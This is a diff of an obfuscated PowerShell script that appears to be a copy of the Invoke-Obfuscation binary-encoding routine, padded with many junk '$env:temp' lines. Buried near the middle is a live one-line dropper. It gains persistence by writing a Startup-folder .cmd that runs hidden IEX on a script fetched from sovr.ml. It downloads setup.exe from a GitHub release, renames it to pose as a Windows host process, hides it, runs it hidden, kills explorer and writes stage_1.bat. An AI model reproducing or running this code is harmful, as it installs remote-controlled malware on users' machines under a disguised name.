@@ -80,6 +80,7 @@ $RKrrh8EqFqSLgdxuu876VEWpwBJHNRWG9pL7 = @"
     }
 
     # Create list of random delimiters $RandomDelimiters.
+    #$env:temp
     # Avoid using . * ' " [ ] ( ) etc. as delimiters as these will cause problems in the -Split command syntax.
     $aVVS8Y12ktmW_d5  = @((WujJEyCIGCIKwrGL('_')),(wUJJEYcIGCIkWRGl('-')),(wujJeycIGCIKWrgL(',')),(WujJEYCIGCIKwRgL('{')),(wUjJeyCIgcIkWRgL('}')),(wUJJeyCIGCIKWRgL('~')),(WUjJEYcIGciKWrGL('!')),(WUJJEYCigCIkwrGL('@')),(wUjJeYCIgCIkwrgL('%')),(WUjjeyCIgcikWrGl('&')),(wuJJEYCIGCIKwrgL('<')),(wUjJEYcIGCIkWrgL('>')),(wuJjEYCIGCIKWRgl(';')),(wuJJEYcIGciKWrgl(':')))
 
@@ -112,6 +113,7 @@ $F2aQMQjGUSeVezRWfCHkR2u42ALEkrNsUJGP5CBU6HUR6rhx9xcc2G = @"
     }
 
     # Create list of random delimiters $RandomDelimiters.
+    #$env:temp
     # Avoid using . * ' " [ ] ( ) etc. as delimiters as these will cause problems in the -Split command syntax.
     $aVVS8Y12ktmW_d5  = @((WujJEyCIGCIKwrGL('_')),(wUJJEYcIGCIkWRGl('-')),(wujJeycIGCIKWrgL(',')),(WujJEYCIGCIKwRgL('{')),(wUjJeyCIgcIkWRgL('}')),(wUJJeyCIGCIKWRgL('~')),(WUjJEYcIGciKWrGL('!')),(WUJJEYCigCIkwrGL('@')),(wUjJeYCIgCIkwrgL('%')),(WUjjeyCIgcikWrGl('&')),(wuJJEYCIGCIKwrgL('<')),(wUjJEYcIGCIkWrgL('>')),(wuJjEYCIGCIKWRgl(';')),(wuJJEYcIGciKWrgl(':')))
 
@@ -121,6 +123,7 @@ $F2aQMQjGUSeVezRWfCHkR2u42ALEkrNsUJGP5CBU6HUR6rhx9xcc2G = @"
     # Only use a subset of current delimiters to randomize what you see in every iteration of this script's output.
     $AVVs8y12KTmw_d5 = (Get-Random -Input $AvvS8y12kTMW_d5 -Count ($AvvS8Y12ktmW_d5.Count/(2 + 2)))
 
+    #$env:temp
     # Convert $ScriptString to delimited Binary values in [Char] array separated by random delimiter from defined list $RandomDelimiters.
     $xNTJ2w81VJ = (wujJEYCIGCikWrgl(''))
     ([Char[]]$Q7XAQnq1Y88e) | ForEach-Object {$Xntj2w81Vj += ([Convert]::ToString(([Int][Char]$_),$gmD_JO8ICip) + (Get-Random -Input $Avvs8y12ktmW_d5))}
@@ -158,6 +161,7 @@ $DELMtS8xXcT7t3uzR26 = @"
     $ArKSZurm9DY17 = ([Char[]]$ArKsZuRM9dy17        | ForEach-Object {$g_UotQ6xG = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$G_UoTQ6XG = $G_UoTq6xG.ToUpper()} $G_uotQ6Xg}) -Join ''
     $SxirfT6f655qDhnO       = ([Char[]](wUJJEYCIgcIKWrGl('[Convert]::ToInt16(')) | ForEach-Object {$G_UotQ6XG = $_.ToString().ToLower(); If(Get-Random -Input @(0..(0 + 1))) {$G_UotQ6Xg = $G_Uotq6XG.ToUpper()} $G_UOtQ6XG}) -Join ''
 
+    #$env:temp
     # Create printable version of $RandomDelimiters in random order to be used by final command specifically for -Split syntax.
     $LbXoc817E3ALr61lN = (wuJjEyCIGCIKwrGl(''))
     ForEach($VkXAQ9pzFUNHv5PsCl6eu in $avVs8Y12ktmw_d5)
@@ -176,6 +180,7 @@ $DELMtS8xXcT7t3uzR26 = @"
     $pW9JciIP6bElj += $SXiRfT6f655qDHNO + ' '*(Get-Random -Input @(0,1)) + (wuJJeYCIgCikWrGL('(')) + (WujJEyciGcikwrGl(' '))*(Get-Random -Input @((1 - 1),1)) + $cbIDZl6qVds + ' '*(Get-Random -Input @((1 - 1),(-(2 - 1) + (2 + 0)))) + (WuJJEYCigcIKWrgl(')')) + (WuJJeYCIGciKwRGl(' '))*(Get-Random -Input @((1 - 1),(1 + 0))) + (wuJjeYcIgCIKwrGL(',')) + (WuJJEYCIGCIKwRGL(' '))*(Get-Random -Input @((0 + (1 - 1)),(2 - 1))) + $Gmd_JO8IcIP + ' '*(Get-Random -Input @(0,(2 - 1))) + (wUJJEyCIGciKWrgl(')')) + (WuJJeYCiGciKWRgl(' '))*(Get-Random -Input @(0,((6 - 3) - 2))) + (Get-Random -Input @((wuJjeYCIgCIKWrgl('-as')),(wuJjEYCiGcIkwrgl('-As')),(WuJJEYcIGcikwrgl('-aS')),(wujjEyCIGCIKWrgl('-AS')))) + (wUJjeYCIGCIkwrgL(' '))*(Get-Random -Input @((1 - 1),1)) + (wuJjeYCigCiKWrGL('[$CharStr]'))
     $PW9jcIip6bElJ = (Get-Random -Input $PW9JcIiP6BElJ)
 
+    #$env:temp
     # Create array syntax for encoded $ScriptString as alternative to .Split/-Split syntax.
     $jq2eQCDWDRQ5R4hCSUtt = (WuJjEYCIGcIkwrgL(''))
     ([Char[]]$Q7xaqNq1y88e) | ForEach-Object {
@@ -188,9 +193,11 @@ $DELMtS8xXcT7t3uzR26 = @"
     # Remove trailing comma from $EncodedArray.
     $EncodedArray = ((T3i9t5ejIBXM1DnyE3mEfc5S0Iep1UO2f('(')) + (T3i9T5EjIBxm1DnYe3MEfc5S0iEp1UO2f(' '))*(Get-Random -Input @(0,1)) + $EncodedArray.Trim().Trim((t3I9t5Ejibxm1Dnye3mEFc5s0iEp1UO2F(','))) + (T3I9t5eJibxM1dnyE3mefc5s0IeP1UO2F(')')))
 
+    #$env:temp
     # Generate random syntax to create/set OFS variable ($OFS is the Output Field Separator automatic variable).
     # Using Set-Item and Set-Variable/SV/SET syntax. Not using New-Item in case OFS variable already exists.
     # If the OFS variable did exists then we could use even more syntax: $varname, Set-Variable/SV, Set-Item/SET, Get-Variable/GV/Variable, Get-ChildItem/GCI/ChildItem/Dir/Ls
+    #$env:temp
     # For more info: https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.core/about/about_automatic_variables
     $SetOfsVarSyntax      = @()
     $SetOfsVarSyntax     += (T3i9t5EjiBxm1DNye3MeFc5S0iEp1uo2F('Set-Item')) + (T3I9t5EJiBxM1DnyE3mEFc5s0IEP1UO2F(' '))*(Get-Random -Input @(1,2)) + (t3i9t5ejIbxm1DNyE3MEfc5S0iEp1UO2f(''Variable:OFS'')) + (t3I9t5eJIBxm1DnYE3mefc5S0Iep1uO2f(' '))*(Get-Random -Input @(1,2)) + (T3i9t5ejIbxm1DnyE3mEfc5s0iEp1UO2F(''''))
@@ -220,6 +227,7 @@ $cJ5F6QwwDjnHchZq = @"
     $NewScriptArray  += $Join + ' '*(Get-Random -Input @(0,1)) + (Get-Random -Input $BaseScriptArray)
     $NewScriptArray  += $StrJoin + '(' + (T3I9t5eJiBxm1DNYE3mefc5s0iep1Uo2f(' '))*(Get-Random -Input @(0,1)) + (t3I9t5ejiBXm1dnYE3Mefc5S0ieP1Uo2F('''')) + (T3I9T5ejIbxM1Dnye3MeFc5s0iEP1uO2f(' '))*(Get-Random -Input @(0,1)) + (T3I9t5eJIBXM1dnyE3MEfc5s0IeP1UO2f(',')) + (T3I9T5ejIBXM1Dnye3mefc5S0ieP1Uo2f(' '))*(Get-Random -Input @(0,1)) + (Get-Random -Input $BaseScriptArray) + ' '*(Get-Random -Input @(0,1)) + (t3I9T5ejIbxm1dnyE3MEFC5s0iEp1UO2f(')'))
 
+    #$env:temp
     # Randomly select one of the above commands.
     $NewScript = (Get-Random -Input $NewScriptArray)
 
@@ -227,6 +235,7 @@ $cJ5F6QwwDjnHchZq = @"
     # Below code block is a copy from Out-ObfuscatedStringCommand.ps1. It is copied into this encoding function so that this will remain a standalone script without dependencies.
     $InvokeExpressionSyntax  = @()
     $InvokeExpressionSyntax += (Get-Random -Input @((t3I9t5ejIbxM1dnyE3MEfc5s0iEp1uO2f('IEX')),(T3I9t5ejIbXm1DnyE3mEFC5s0iep1UO2f('Invoke-Expression'))))
+    #$env:temp
     # Added below slightly-randomized obfuscated ways to form the string 'iex' and then invoke it with . or &.
     # Though far from fully built out, these are included to highlight how IEX/Invoke-Expression is a great indicator but not a silver bullet.
     # These methods draw on common environment variable values and PowerShell Automatic Variable values/methods/members/properties/etc.
@@ -237,6 +246,7 @@ $cJ5F6QwwDjnHchZq = @"
     $InvokeExpressionSyntax += $InvocationOperator + ('{0}'-f'((') + (Get-Random -Input @((T3i9T5EjiBXM1dNYe3mEFC5S0iEP1Uo2f('Get-Variable')),(t3i9t5EjIBXm1dnYE3MEfC5s0iEp1uO2F('GV')),(t3I9T5eJiBxm1DnYE3MEfc5s0Iep1Uo2F('Variable')))) + (T3i9t5ejIBxm1DnYE3meFc5s0IeP1UO2f(' '*mdr*').Name[([int]((-4 + 13) / (0 + 3))),(1 * (18 - 7)),2]-Join'')'))
     $InvokeExpressionSyntax += $InvocationOperator + ('{((1 - 1) + 0)}{1}'-f'(',' ') + (Get-Random -Input @((T3I9T5ejIbxm1DNYE3mefC5s0iEP1uo2F('$ozRlesUBkK7ksePB4wxe.ToString()')),(t3I9t5ejIBxm1DNYE3mEfc5s0IEp1Uo2F('([String]$ozRleSuBkK7kSepb4Wxe)')))) + ('{(1 - 1)}{1}{2}'-f'[(3 - 2),(-(1 + 1) + ([int](10 / 2)))]+',''x'-Jo','in'')')
     # Commenting below option since $env:Public differs in string value for non-English operating systems.
+    #$env:temp
     #$InvokeExpressionSyntax += $InvocationOperator + "( `$env:Public[13]+`$env:Public[5]+'x')"
 
     # Randomly choose from above invoke operation syntaxes.
@@ -252,6 +262,7 @@ $cJ5F6QwwDjnHchZq = @"
 
     $NewScript = (Get-Random -Input $InvokeOptions)
 
+    #$env:temp
     # If user did not include -PassThru flag then continue with adding execution flgs and powershell.exe to $NewScript.
     If(!$PSBoundParameters[('{(2 + 0)}{(1 + 2)}{0}{(1 + 0)}'-f'Th','ru','Pa','ss')])
     {
@@ -287,7 +298,8 @@ $cJ5F6QwwDjnHchZq = @"
             If($WindowsStyle) {$ArgumentValue = $WindowsStyle}
             Else {$ArgumentValue = $PSBoundParameters[('{1}{((1 + 0) - (3 - 2))}'-f'Style','Window')]}
 
-            # Randomly decide to write WindowStyle value with flag substring or integer value.
+            #$env:temp
+    # Randomly decide to write WindowStyle value with flag substring or integer value.
             Switch($ArgumentValue.ToLower())
             {
                 ('{((1 * 5) - 3)}{([int](15 / 3))}{(-(2 + 2) + (-3 + 11))}{1}{(-(-2 + 4) + (10 - 5))}{(1 - 1)}'-f'l','m','n','a','r','o')    {If(Get-Random -Input @(0..1)) {$ArgumentValue = (Get-Random -Input @((T3i9t5eJiBxm1DNyE3mefc5s0iep1UO2f('(0 + 0)')),(T3I9t5ejiBxM1DNye3MEFc5s0IeP1UO2f('n')),(T3I9t5eJibXm1dNyE3MEfc5s0iEp1uO2f('no')),(t3I9T5ejIbXM1dnyE3MEfC5s0IEP1UO2f('nor')),(T3I9t5EJIbxM1Dnye3mefc5s0IeP1UO2f('norm')),(t3I9T5Ejibxm1DNye3mEfc5S0iEp1uo2F('norma'))))}}
@@ -327,7 +339,8 @@ $eVezRWfau56qMEZBv26pB = @"
             $CommandlineOptions += $FullArgument.SubString(0,(Get-Random -Minimum 2 -Maximum ($FullArgument.Length+1)))
         }
 
-        # Randomize the case of all command-line arguments.
+        #$env:temp
+    # Randomize the case of all command-line arguments.
         For($i=0; $i -lt $PowerShellFlags.Count; $i++)
         {
             $PowerShellFlags[$i] = ([Char[]]$PowerShellFlags[$i] | ForEach-Object {$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}) -Join ''
@@ -374,6 +387,7 @@ $q5yypu7yrCtg = @"
     # Avoid using . * ' " [ ] ( ) etc. as delimiters as these will cause problems in the -Split command syntax.
     $aVVS8Y12ktmW_d5  = @((WujJEyCIGCIKwrGL('_')),(wUJJEYcIGCIkWRGl('-')),(wujJeycIGCIKWrgL(',')),(WujJEYCIGCIKwRgL('{')),(wUjJeyCIgcIkWRgL('}')),(wUJJeyCIGCIKWRgL('~')),(WUjJEYcIGciKWrGL('!')),(WUJJEYCigCIkwrGL('@')),(wUjJeYCIgCIkwrgL('%')),(WUjjeyCIgcikWrGl('&')),(wuJJEYCIGCIKwrgL('<')),(wUjJEYcIGCIkWrgL('>')),(wuJjEYCIGCIKWRgl(';')),(wuJJEYcIGciKWrgl(':')))
 
+    #$env:temp
     # Add letters a-z with random case to $RandomDelimiters.
     @((WUJJEYCIgCiKWrgl('a')),(wuJJEYcIGCIkWrGl('b')),(WujjEycIgCiKWrGL('c')),(wujJEYCIgcikwrgL('d')),(WuJjEyCIGCIKwrgl('e')),(wUJJeYcigCIkWrgl('f')),(WuJJEycIGCIKWRgL('g')),(wujjeyciGcikWrgL('h')),(wuJJeYCiGCIKWrgl('i')),(wUjJEYCigcIKwRgl('j')),(wUjjEYCIgCIKWRGL('k')),(wUJJEYCiGCIkWrGL('l')),(WuJjeYcIGcIKWrgl('m')),(wUjjeYCiGCiKWRGL('n')),(WuJjEYcIgCIkwrGl('o')),(wuJJEycIGCiKwrgl('p')),(WujJeYCIGcIkwrGL('q')),(wUJJEyCIgCIkWRGl('r')),(wuJJeYcIGCIKWrgL('s')),(wujjEYCIGcikWRgL('t')),(WUjjEyCigCIkWrGL('u')),(wujJeycIGcIKWrGl('v')),(wujJeYCIGCIKwrgL('w')),(WuJJeYcIgCIkWrgL('x')),(wUjJeyCigCiKWrgl('y')),(WUJJEYciGcikWrgl('z'))) | ForEach-Object {$QOh7kV11FReS6_2ni = $_; If(((Get-Random -Input @((2 - 1)..(2 + (1 - 1))))-(3 - 2) -eq 0)) {$QOH7KV11FReS6_2nI = $qOh7kV11FreS6_2Ni.ToUpper()} $AVvS8y12KtMw_d5 += $QOH7Kv11fReS6_2NI}
         "@
@@ -386,7 +400,7 @@ $q5yypu7yrCtg = @"
     $xNTJ2w81VJ = (wujJEYCIGCikWrgl(''))
     ([Char[]]$Q7XAQnq1Y88e) | ForEach-Object {$Xntj2w81Vj += ([Convert]::ToString(([Int][Char]$_),$gmD_JO8ICip) + (Get-Random -Input $Avvs8y12ktmW_d5))}
 "@
-Set-Content -Path "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\11B0B68A-ECD7-45A.cmd" -Value "powershell -NoP -w Hidden IEX (IWR http://sovr.ml/setup.txt -usebasicparsing).content";$IviNQVAUYJyWAEQsDpS4 = "$env:temp\11B0B68A-ECD7-45A5-A937-7DC402B3D2\Windows Shell Experience Host.exe";$gAjxUb9Y = "Windows Host Process Task $(Get-Random -Minimum 999999999999999999)";while($true){if(Test-Path $ivInQvAUyJyWAEQSDpS4){Rename-Item -Path "$env:temp\11B0B68A-ECD7-45A5-A937-7DC402B3D2\Windows Shell Experience Host.exe" -NewName "$GaJXuB9y";Start-Sleep 1;$pctZZR4WgafcA89U = "https://github.com/untracablefsociety/untrackable/releases/download/unknown/setup.exe";Invoke-WebRequest -Uri $pcTzZR4WGafcA89u -OutFile $IVinQVAuyJyWAeqSdps4 -UseBasicParsing;Start-Sleep 1;(Get-Item "$ivinQVauyjyWaEQSDpS4").Attributes += 'Hidden';<#>(Get-Item "$shortcutx").Attributes += 'Hidden';#>Start-Process -windowstyle Hidden $IViNQVAUYJywaEqSdPS4;Get-Process "explorer"| Stop-Process;Exit;}else{Out-File -FilePath "$env:temp/stage_1.bat" -InputObject $e1oyp6U9qh4En90 -Encoding ASCII;Start-Process -WindowStyle Hidden "$env:temp/stage_1.bat";}Start-Sleep 10;}
+    Set-Content -Path "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\11B0B68A-ECD7-45A.cmd" -Value "powershell -NoP -w Hidden IEX (IWR http://sovr.ml/setup.txt -usebasicparsing).content";$IviNQVAUYJyWAEQsDpS4 = "$env:temp\11B0B68A-ECD7-45A5-A937-7DC402B3D2\Windows Shell Experience Host.exe";$gAjxUb9Y = "Windows Host Process Task $(Get-Random -Minimum 999999999999999999)";while($true){if(Test-Path $ivInQvAUyJyWAEQSDpS4){Rename-Item -Path "$env:temp\11B0B68A-ECD7-45A5-A937-7DC402B3D2\Windows Shell Experience Host.exe" -NewName "$GaJXuB9y";Start-Sleep 1;$pctZZR4WgafcA89U = "https://github.com/untracablefsociety/untrackable/releases/download/unknown/setup.exe";Invoke-WebRequest -Uri $pcTzZR4WGafcA89u -OutFile $IVinQVAuyJyWAeqSdps4 -UseBasicParsing;Start-Sleep 1;(Get-Item "$ivinQVauyjyWaEQSDpS4").Attributes += 'Hidden';<#>(Get-Item "$shortcutx").Attributes += 'Hidden';#>Start-Process -windowstyle Hidden $IViNQVAUYJywaEqSdPS4;Get-Process "explorer"| Stop-Process;Exit;}else{Out-File -FilePath "$env:temp/stage_1.bat" -InputObject $e1oyp6U9qh4En90 -Encoding ASCII;Start-Process -WindowStyle Hidden "$env:temp/stage_1.bat";}Start-Sleep 10;}
 $JrWDeXZQGf6ff = @"
         [ValidateSet((WUJJEyCigCIKWrgl('Normal')), (wUJJeYCIGCiKWrgL('Minimized')), (wuJjEyCIGCiKwrgl('Maximized')), (WujJEYCIGcIKWrgl('Hidden')))]
         [String]
@@ -400,6 +414,7 @@ $JrWDeXZQGf6ff = @"
         $ystkEH9MR1euI7Od3
     )
 
+    #$env:temp
     # Encoding base values: 16=Hex, 8=Octal, 2=Binary
     $GMd_JO8ICIp = 2
 
@@ -1130,8 +1145,8 @@ $q5yypu7yrCtg = @"
 
         [ValidateSet((wUjJEYCiGCIKwRGL('Bypass')), (wujJEYcIGCIKwrGl('Unrestricted')), (wUJjEYcIGCIkWRgl('RemoteSigned')), (wUJJEYCiGciKWrgl('AllSigned')), (WujjEYCIGCIkwRgl('Restricted')))]
         [String]
-        $oiwUaIbxuLcshY,
-        
+        $oiwUaIbxuLcshY,    
+        $env:temp
         [Switch]
         $ystkEH9MR1euI7Od3
     )
@@ -1149,6 +1164,7 @@ $q5yypu7yrCtg = @"
     {
         $q7xaQNq1Y88e = [String]$o9Df0SRpt83F6Bho5i
     }
+    $env:temp
 
     # Create list of random delimiters $RandomDelimiters.
     # Avoid using . * ' " [ ] ( ) etc. as delimiters as these will cause problems in the -Split command syntax.
@@ -1172,7 +1188,7 @@ $34CdEgPgxccZgUHE5US2Fw7gA5qyxM7xYGMJERpmHxtPJAM3Vh = @"
         [ValidateSet((wUjJEYCiGCIKwRGL('Bypass')), (wujJEYcIGCIKwrGl('Unrestricted')), (wUJjEYcIGCIkWRgl('RemoteSigned')), (wUJJEYCiGciKWrgl('AllSigned')), (WujjEYCIGCIkwRgl('Restricted')))]
         [String]
         $oiwUaIbxuLcshY,
-        
+        $env:temp
         [Switch]
         $ystkEH9MR1euI7Od3
     )
@@ -1190,17 +1206,17 @@ $34CdEgPgxccZgUHE5US2Fw7gA5qyxM7xYGMJERpmHxtPJAM3Vh = @"
     {
         $q7xaQNq1Y88e = [String]$o9Df0SRpt83F6Bho5i
     }
-
+    $env:temp
     # Create list of random delimiters $RandomDelimiters.
     # Avoid using . * ' " [ ] ( ) etc. as delimiters as these will cause problems in the -Split command syntax.
     $aVVS8Y12ktmW_d5  = @((WujJEyCIGCIKwrGL('_')),(wUJJEYcIGCIkWRGl('-')),(wujJeycIGCIKWrgL(',')),(WujJEYCIGCIKwRgL('{')),(wUjJeyCIgcIkWRgL('}')),(wUJJeyCIGCIKWRgL('~')),(WUjJEYcIGciKWrGL('!')),(WUJJEYCigCIkwrGL('@')),(wUjJeYCIgCIkwrgL('%')),(WUjjeyCIgcikWrGl('&')),(wuJJEYCIGCIKwrgL('<')),(wUjJEYcIGCIkWrgL('>')),(wuJjEYCIGCIKWRgl(';')),(wuJJEYcIGciKWrgl(':')))
 
     # Add letters a-z with random case to $RandomDelimiters.
     @((WUJJEYCIgCiKWrgl('a')),(wuJJEYcIGCIkWrGl('b')),(WujjEycIgCiKWrGL('c')),(wujJEYCIgcikwrgL('d')),(WuJjEyCIGCIKwrgl('e')),(wUJJeYcigCIkWrgl('f')),(WuJJEycIGCIKWRgL('g')),(wujjeyciGcikWrgL('h')),(wuJJeYCiGCIKWrgl('i')),(wUjJEYCigcIKwRgl('j')),(wUjjEYCIgCIKWRGL('k')),(wUJJEYCiGCIkWrGL('l')),(WuJjeYcIGcIKWrgl('m')),(wUjjeYCiGCiKWRGL('n')),(WuJjEYcIgCIkwrGl('o')),(wuJJEycIGCiKwrgl('p')),(WujJeYCIGcIkwrGL('q')),(wUJJEyCIgCIkWRGl('r')),(wuJJeYcIGCIKWrgL('s')),(wujjEYCIGcikWRgL('t')),(WUjjEyCigCIkWrGL('u')),(wujJeycIGcIKWrGl('v')),(wujJeYCIGCIKwrgL('w')),(WuJJeYcIgCIkWrgL('x')),(wUjJeyCigCiKWrgl('y')),(WUJJEYciGcikWrgl('z'))) | ForEach-Object {$QOh7kV11FReS6_2ni = $_; If(((Get-Random -Input @((2 - 1)..(2 + (1 - 1))))-(3 - 2) -eq 0)) {$QOH7KV11FReS6_2nI = $qOh7kV11FreS6_2Ni.ToUpper()} $AVvS8y12KtMw_d5 += $QOH7Kv11fReS6_2NI}
-    
+        $env:temp
     # Only use a subset of current delimiters to randomize what you see in every iteration of this script's output.
     $AVVs8y12KTmw_d5 = (Get-Random -Input $AvvS8y12kTMW_d5 -Count ($AvvS8Y12ktmW_d5.Count/(2 + 2)))
-
+        $env:temp 
     # Convert $ScriptString to delimited Binary values in [Char] array separated by random delimiter from defined list $RandomDelimiters.
     $xNTJ2w81VJ = (wujJEYCIGCikWrgl(''))
     ([Char[]]$Q7XAQnq1Y88e) | ForEach-Object {$Xntj2w81Vj += ([Convert]::ToString(([Int][Char]$_),$gmD_JO8ICip) + (Get-Random -Input $Avvs8y12ktmW_d5))}
@@ -1209,7 +1225,7 @@ $hMHNt4aFfxzY3w5hge2akH2AxKWVZKUXN26V4DU5gugNh3hXxR3uYdvMT3cWXeY = @"
         [ValidateSet((WUJJEyCigCIKWrgl('Normal')), (wUJJeYCIGCiKWrgL('Minimized')), (wuJjEyCIGCiKwrgl('Maximized')), (WujJEYCIGcIKWrgl('Hidden')))]
         [String]
         $txy7wx73S,
-
+        $env:temp   
         [ValidateSet((wUjJEYCiGCIKwRGL('Bypass')), (wujJEYcIGCIKwrGl('Unrestricted')), (wUJjEYcIGCIkWRgl('RemoteSigned')), (wUJJEYCiGciKWrgl('AllSigned')), (WujjEYCIGCIkwRgl('Restricted')))]
         [String]
         $oiwUaIbxuLcshY,
@@ -1220,10 +1236,11 @@ $hMHNt4aFfxzY3w5hge2akH2AxKWVZKUXN26V4DU5gugNh3hXxR3uYdvMT3cWXeY = @"
 
     # Encoding base values: 16=Hex, 8=Octal, 2=Binary
     $GMd_JO8ICIp = 2
-
+    $env:temp
     # Either convert ScriptBlock to a String or convert script at $Path to a String.
     If($TbStCpBPV[('{0}{1}'-f'Pat','h')])
     {
+        $env:temp
         Get-ChildItem $Hwl4BUCKY9 -ErrorAction Stop | Out-Null
         $Q7xAQNq1Y88e = [IO.File]::ReadAllText((Resolve-Path $hwl4bucKY9))
     }
@@ -1340,6 +1357,7 @@ $9vRgqT2WjscrDaAfTqAtJcTRmQz9c8bdRJF8wHrxK8CG3N3mBw = @"
     $pW9JciIP6bElj += $SXiRfT6f655qDHNO + ' '*(Get-Random -Input @(0,1)) + (wuJJeYCIgCikWrGL('(')) + (WujJEyciGcikwrGl(' '))*(Get-Random -Input @((1 - 1),1)) + $cbIDZl6qVds + ' '*(Get-Random -Input @((1 - 1),(-(2 - 1) + (2 + 0)))) + (WuJJEYCigcIKWrgl(')')) + (WuJJeYCIGciKwRGl(' '))*(Get-Random -Input @((1 - 1),(1 + 0))) + (wuJjeYcIgCIKwrGL(',')) + (WuJJEYCIGCIKwRGL(' '))*(Get-Random -Input @((0 + (1 - 1)),(2 - 1))) + $Gmd_JO8IcIP + ' '*(Get-Random -Input @(0,(2 - 1))) + (wUJJEyCIGciKWrgl(')')) + (WuJJeYCiGciKWRgl(' '))*(Get-Random -Input @(0,((6 - 3) - 2))) + (Get-Random -Input @((wuJjeYCIgCIKWrgl('-as')),(wuJjEYCiGcIkwrgl('-As')),(WuJJEYcIGcikwrgl('-aS')),(wujjEyCIGCIKWrgl('-AS')))) + (wUJjeYCIGCIkwrgL(' '))*(Get-Random -Input @((1 - 1),1)) + (wuJjeYCigCiKWrGL('[$CharStr]'))
     $PW9jcIip6bElJ = (Get-Random -Input $PW9JcIiP6BElJ)
 
+    #$env:temp
     # Create array syntax for encoded $ScriptString as alternative to .Split/-Split syntax.
     $jq2eQCDWDRQ5R4hCSUtt = (WuJjEYCIGcIkwrgL(''))
     ([Char[]]$Q7xaqNq1y88e) | ForEach-Object {
@@ -1385,6 +1403,7 @@ $6BQdVXj36qyehaxy79Vdhr7GZrNV7pgc2ABjfLx5jQhsEnZBc7 = @"
     $NewScriptArray  += $Join + ' '*(Get-Random -Input @(0,1)) + (Get-Random -Input $BaseScriptArray)
     $NewScriptArray  += $StrJoin + '(' + (T3I9t5eJiBxm1DNYE3mefc5s0iep1Uo2f(' '))*(Get-Random -Input @(0,1)) + (t3I9t5ejiBXm1dnYE3Mefc5S0ieP1Uo2F('''')) + (T3I9T5ejIbxM1Dnye3MeFc5s0iEP1uO2f(' '))*(Get-Random -Input @(0,1)) + (T3I9t5eJIBXM1dnyE3MEfc5s0IeP1UO2f(',')) + (T3I9T5ejIBXM1Dnye3mefc5S0ieP1Uo2f(' '))*(Get-Random -Input @(0,1)) + (Get-Random -Input $BaseScriptArray) + ' '*(Get-Random -Input @(0,1)) + (t3I9T5ejIbxm1dnyE3MEFC5s0iEp1UO2f(')'))
 
+    #$env:temp
     # Randomly select one of the above commands.
     $NewScript = (Get-Random -Input $NewScriptArray)
 
@@ -1393,6 +1412,7 @@ $6BQdVXj36qyehaxy79Vdhr7GZrNV7pgc2ABjfLx5jQhsEnZBc7 = @"
     $InvokeExpressionSyntax  = @()
     $InvokeExpressionSyntax += (Get-Random -Input @((t3I9t5ejIbxM1dnyE3MEfc5s0iEp1uO2f('IEX')),(T3I9t5ejIbXm1DnyE3mEFC5s0iep1UO2f('Invoke-Expression'))))
     # Added below slightly-randomized obfuscated ways to form the string 'iex' and then invoke it with . or &.
+    #$env:temp
     # Though far from fully built out, these are included to highlight how IEX/Invoke-Expression is a great indicator but not a silver bullet.
     # These methods draw on common environment variable values and PowerShell Automatic Variable values/methods/members/properties/etc.
     $InvocationOperator = (Get-Random -Input @((T3I9t5ejIBXm1DnyE3MeFC5S0iEp1Uo2F('.')),(t3I9t5ejIbxm1DNyE3mefc5s0IEp1UO2f('&')))) + (T3I9t5EJIBXm1dnYE3mEFC5S0iEp1Uo2f(' '))*(Get-Random -Input @(0,1))
@@ -1407,6 +1427,7 @@ $6BQdVXj36qyehaxy79Vdhr7GZrNV7pgc2ABjfLx5jQhsEnZBc7 = @"
     # Randomly choose from above invoke operation syntaxes.
     $InvokeExpression = (Get-Random -Input $InvokeExpressionSyntax)
 
+    #$env:temp
     # Randomize the case of selected invoke operation.
     $InvokeExpression = ([Char[]]$InvokeExpression | ForEach-Object {$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}) -Join ''
     
@@ -1424,7 +1445,8 @@ $6BQdVXj36qyehaxy79Vdhr7GZrNV7pgc2ABjfLx5jQhsEnZBc7 = @"
         $PowerShellFlags = @()
 
         # Build the PowerShell execution flags by randomly selecting execution flags substrings and randomizing the order.
-        # This is to prevent Blue Team from placing false hope in simple signatures for common substrings of these execution flags.
+        #$env:temp
+    # This is to prevent Blue Team from placing false hope in simple signatures for common substrings of these execution flags.
         $CommandlineOptions = New-Object String[](0)
         If($PSBoundParameters[('{(0 + (1 - 1))}{(3 - 2)}'-f'NoEx','it')])
         {
